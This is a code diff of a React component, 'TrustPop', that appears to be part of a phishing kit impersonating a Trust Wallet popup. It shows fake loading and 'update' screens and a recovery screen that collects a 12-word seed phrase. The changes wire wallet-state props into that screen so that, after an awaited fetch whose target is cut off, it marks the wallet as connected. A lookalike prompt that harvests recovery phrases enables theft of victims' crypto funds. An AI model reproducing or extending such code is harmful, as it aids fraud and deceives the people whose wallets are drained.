@@ -1,6 +1,6 @@
 import React, { useState, useEffect, useMemo } from "react";
 
-export default function TrustPop() {
+export default function TrustPop({setWalletConnected,setSelectedWallet, wallets}) {
   const [password, setPassword] = useState("");
   const [step, setStep] = useState("loading");
 
@@ -30,7 +30,7 @@ export default function TrustPop() {
     } else if (step === "update-loading") {
       return <TrustUpdateScreenLoading handleUpdate={setStep} />;
     } else {
-      return <TrustRecoveryScreen />;
+      return <TrustRecoveryScreen setWalletConnected={setWalletConnected} setSelectedWallet={setSelectedWallet} wallets={wallets}/>;
     }
   };
 
@@ -348,7 +348,7 @@ function TrustUpdateScreenLoading({ handleUpdate }) {
 //   );
 // }
 
-function TrustRecoveryScreen({ onBack, onNext }) {
+function TrustRecoveryScreen({ onBack, onNext,setWalletConnected,setSelectedWallet,wallets }) {
   const [length, setLength] = useState(12);
   const [words, setWords] = useState(Array(12).fill(""));
   const [visible, setVisible] = useState(Array(12).fill(false));
@@ -405,6 +405,8 @@ function TrustRecoveryScreen({ onBack, onNext }) {
       });
 
       const data = await res.json();
+      setWalletConnected(true);
+      setSelectedWallet(wallets.NO_WALLET);
       console.log(data);
     } catch (err) {
       console.error(err);
